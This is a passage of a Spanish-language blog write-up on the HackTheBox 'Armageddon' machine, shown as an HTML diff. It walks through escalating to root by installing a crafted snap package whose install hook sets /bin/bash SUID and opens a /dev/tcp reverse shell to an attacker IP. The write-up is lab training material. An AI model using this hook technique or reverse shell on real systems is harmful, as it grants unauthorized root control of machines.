+  <li><a href="https://es.wikipedia.org/wiki/Snap_(gestor_de_paquetes)">https://es.wikipedia.org/wiki/Snap_(gestor_de_paquetes)</a>.</li>
+</ul>
+
+<p>Bien, haciendo una búsqueda rápida sobre vulnerabilidades relacionadas nos encontramos una antigua, tiene su <strong>CVE</strong> e incluso exploits en <strong>GitHub</strong>:</p>
+
+<ul>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7304">cve.mitre.org - CVE-2019-7304</a>.</li>
+  <li><a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a>.</li>
+</ul>
+
+<p>El problema básicamente viene de la <strong>API</strong> que implementa <strong>snapd</strong> en sus versiones menores a <code>2.37.1</code>, esto permitiendo conseguir ejecución de comandos en el sistema para obtener privesc… Pero validando nuestra versión de <strong>snap</strong> (<code>snap --version</code>) vemos que es mayor a la vulnerable e incluso probándolo (por los loles) el exploit nos indica que el sistema no es vulnerable. Les dejo el post que tiene una explicación excepcional de la vulnerabilidad por si le quieren echar un ojo:</p>
+
+<ul>
+  <li><a href="https://initblog.com/2019/dirty-sock/">Writeup - Linux Privilege Escalation via snapd (dirty_sock exploit)</a>.</li>
+</ul>
+
+<p>¿Pero entonces para qué hacemos mención de esto? Bueno, si recordamos tenemos permisos de instalar paquetes <code>.snap</code> mediante <strong>snap</strong> (se repite, pero es necesario :P), el exploit en su estructura usa un paquete para la explotación, ya que al momento de estar instalando el <code>.snap</code>, se están ejecutando los comandos del atacante. En el mismo post hay un paso a paso para crear un paquete con el contenido malicioso, veamos:</p>
+
+<p><span style="color: red;">1. </span>Instalamos la herramienta que nos permite generar los paquetes.</p>
+
+<pre><code class="language-bash">sudo apt install snapcraft -y
+o
+sudo snap install snapcraft --classic
+</code></pre>
+
+<p><span style="color: red;">2. </span>Creamos directorios de trabajo, esto para ser organizados :P</p>
+
+<pre><code class="language-bash">cd /tmp
+mkdir dirty
+cd dirty
+</code></pre>
+
+<p><span style="color: red;">3. </span>Le indicamos que nos inicie el directorio actual como un proyecto snap.</p>
+
+<pre><code class="language-bash">snapcraft init
+</code></pre>
+
+<p><span style="color: red;">4. </span>Preparamos el sitio donde guardaremos lo que será invocado cuando se esté instalando el paquete, también llamados <strong>hooks</strong>.</p>
+
+<pre><code class="language-bash">mkdir snap/hooks
+touch snap/hooks/install
+chmod a+x snap/hooks/install
+</code></pre>
+
+<blockquote>
+  <p>Additionally, snaps have something called “hooks”. One such hook, the “install hook” is run at the time of snap installation and can be a simple shell script.</p>
+  <blockquote>
+    <p><a href="https://initblog.com/2019/dirty-sock/">https://initblog.com/2019/dirty-sock/</a>.</p>
+  </blockquote>
+</blockquote>
+
+<p>O sea que cuando estemos instalando el paquete, invocara el hook (:</p>
+
+<p><span style="color: red;">5. </span>Escribimos nuestro payload, el <code>"EOF"</code> simplemente le indica a <code>cat</code> cuando terminar de escribir el archivo <code>install</code>.</p>
+
+<p><strong>Este y el paso 6 se pueden hacer simplemente abriendo el archivo con <code>nano</code>, <code>vim</code>, <code>vi</code>, etc. Pues por si algo</strong>.</p>
+
+<p>Inicialmente probaré a guardar el output del <code>id</code> del usuario que ejecuta la instalación, que si todo va bien debería ser <strong>root</strong> (: Esto como prueba inicial…</p>
+
+<pre><code class="language-bash">cat &gt; snap/hooks/install &lt;&lt; "EOF"
+#!/bin/bash
+
+id &gt; /dev/shm/.id.txt
+EOF
+</code></pre>
+
+<p><span style="color: red;">6. </span>Configuramos el archivo <code>snapcraft.yaml</code>, la estructura de nuestro paquete.</p>
+
+<pre><code class="language-bash">cat &gt; snap/snapcraft.yaml &lt;&lt; "EOF"
+name: dirty-sock
+version: '0.1' 
+summary: Como esssssssssssssssss
+description: |
+    Como seriaaaaaaaaaaaaa, como nos toqueeeeeeeeeee!
+
+grade: devel
+confinement: devmode
+
+parts:
+  my-part:
+    plugin: nil
+EOF
+</code></pre>
+
+<p><span style="color: red;">7. </span>Construimos finalmente el paquete.</p>
+
+<pre><code class="language-bash">snapcraft
+</code></pre>
+
+<p>Ahora que sabemos los pasos, procedamos a ejecutarlos…</p>
+
+<p>Ejecutando el último paso nos da un error:</p>
+
+<pre><code class="language-bash">❭ snapcraft
+This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
+This project is best built on 'Ubuntu 16.04', but is building on a 'Parrot GNU/Linux 4.9' host.
+Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
+Sorry, an error occurred in Snapcraft:
+Native builds aren't supported on Parrot GNU/Linux. You can however use 'snapcraft cleanbuild' with a container.
+</code></pre>
+
+<p>Si nos fijamos en el output (y recordamos en nuestro research sobre como crear paquetes en Linux) se habla de que va mucho mejor en <strong>Ubuntu</strong> y que en <strong>Parrot OS</strong> no tenemos las opciones nativas… Acá intenté jugar con las “soluciones” que nos daba el propio output y también <a href="https://snapcraft.io/docs/build-options">con estas maneras de build</a> ofrecidas por una guía](https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy), pero nada, no conseguí construir el paquete.</p>
+
+<ul>
+  <li><a href="https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy">Building a snap is easy</a>.</li>
+</ul>
+
+<p>Así que decidí probar a generarlo con una VM <strong>Ubuntu</strong> a ver si era problema mío o si está hecho exclusivamente para <strong>Ubuntu</strong> (aunque pueda que no sea ninguna de las dos opciones :P)… Haciendo el mismo proceso y llegando al último paso nos responde:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323ubu_generating_snapFile_done.png" alt="323ubu_generating_snapFile_done" /></p>
+
+<p>Perfecto, se nos genera el archivo, lo pasamos a nuestra máquina de atacante, lo subimos a la máquina víctima e instalamos:</p>
+
+<p>Nos ponemos es escucha mediante un servidor en <strong>Python</strong>:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y ahora lo descargamos:</p>
+
+<pre><code class="language-bash">[brucetherealadmin@armageddon shm]$ curl http://10.10.14.164:8000/dirty-sock_0.1_amd64.snap -o dirty-sock_0.1_amd64.snap
+[brucetherealadmin@armageddon shm]$ ls
+dirty-sock_0.1_amd64.snap
+[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install *
+error: cannot find signatures with metadata for snap "dirty-sock_0.1_amd64.snap"
+
+# Le agregamos el parametro "--devmode" para que lo tome como "prueba"
+[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmode
+dirty-sock 0.1 installed
+</code></pre>
+
+<p>Instalado, asi que validemos si se generó el archivo <code>.id.txt</code>:</p>
+
+<pre><code class="language-bash">[brucetherealadmin@armageddon shm]$ ls -la
+total 8
+drwxrwxrwt.  2 root              root                80 abr  6 16:27 .
+drwxr-xr-x. 19 root              root              3100 abr  6 16:23 ..
+-rw-rw-r--.  1 brucetherealadmin brucetherealadmin 4096 abr  6 16:26 dirty-sock_0.1_amd64.snap
+-rw-r--r--.  1 root              root                89 abr  6 16:27 .id.txt
+[brucetherealadmin@armageddon shm]$ cat .id.txt 
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+[brucetherealadmin@armageddon shm]$
+</code></pre>
+
+<p>Perfectooooooooooooooooooooooo, tenemos ejecución de comandos en el sistema como el usuario <strong>root</strong>… Ahora intentemos generar una reverse Shell y si no nos funciona también podemos intentar modificar los permisos del binario <code>/bin/bash</code> y agregarle que ahora sea <code>SUID</code>, para que nos dé una <code>bash</code> con respecto al usuario propietario sin problemas (o sea <strong>root</strong>)… Veamos:</p>
+
+<p>Modificamos el archivo <code>install</code>:</p>
+
+<pre><code class="language-bash">❭ cat snap/hooks/install
+#!/bin/bash
+
+shred -zun 11 /dev/shm/.id.txt·
+chmod 4755 /bin/bash·
+bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.164/4433 0&gt;&amp;1"
+</code></pre>
+
+<p>Generamos el paquete:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323ubu_generating_snapFile_revSH_done.png" alt="323ubu_generating_snapFile_revSH_done" /></p>
+
+<p>Y ahora lo subimos a la máquina. Nos ponemos en escucha (<code>nc -lvp 4433</code>) e instalamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_revSH_done.png" alt="323bash_revSH_done" /></p>
+
+<p>(Arriba se explotó o bueno, se queda abierto mientras tenemos la Shell ejecutando)</p>
+
+<p>Ya somos <strong>root</strong> en el sistema, o sea podemos hacer lo que queramos :P</p>
+
+<p>Peeeero también se supone que asignamos el permiso <strong>SUID</strong> al binario <code>/bin/bash</code>, echémosle un ojo y entendamos para qué lo hicimos.</p>
+
+<blockquote>
+  <p>(Parece que entra en conflicto con la reverse shell, asi que mejor creemos un paquete que simplemente haga esa tarea)</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ cat snap/hooks/install
+#!/bin/bash
+
+chmod 4755 /bin/bash·
+</code></pre>
+
+<p>Y al instalarlo:</p>
+
+<pre><code class="language-bash">[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install * --devmode
+error: cannot perform the following tasks:
+- Run install hook of "dirty-sock" snap if present (run hook "install": chmod: changing permissions of '/bin/bash': Read-only file system)
+</code></pre>
+
+<p>F, no nos deja… Podríamos intentar con <code>/bin/sh</code>, pero no nos dejaría porque es un link hacia la <code>bash</code>:</p>
+
+<pre><code class="language-bash">[brucetherealadmin@armageddon shm]$ ls -la /bin/sh
+lrwxrwxrwx. 1 root root 4 dic  3 09:35 /bin/sh -&gt; bash
+</code></pre>
+
+<p>Pues nada, cambiando el permiso <strong>SUID</strong> del binario <code>/bin/bash</code> podríamos haberle indicado con la instrucción <code>/bin/bash -p</code> que ejecute la <code>bash</code> con respecto al usuario propietario del objeto, o sea <strong>root</strong>, pero no lo logramos.</p>
+
+<p>De igual forma ya tenemos una Reverse Shell como <strong>root</strong>, así que prácticamente tenemos todo (: Ahora solo nos quedaría ver las flags (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323flags.png" alt="323flags" /></p>
+
+<p>…</p>
+
+<p>Hemo teminao’</p>
+
+<p>Me gusto que el inicio tiró hacia la realidad (al ser un CVE), algunas malas configuraciones y finalmente el jugueteo con una vulnerabilidad conocida y real (CVE también) pero pensando lateralmente… Me gusto la máquina.</p>
+
+<p>Y bueno, como siempre y como nunca, a seguir rompiendo todo y nos leeremos en algún sitio de la vida (: Gracias por pasarte…</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Armageddon&url=http://localhost:4000/htb/armageddon" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#drupal">drupal</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#snap">snap</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastard">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastard">HackTheBox - Bastard</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
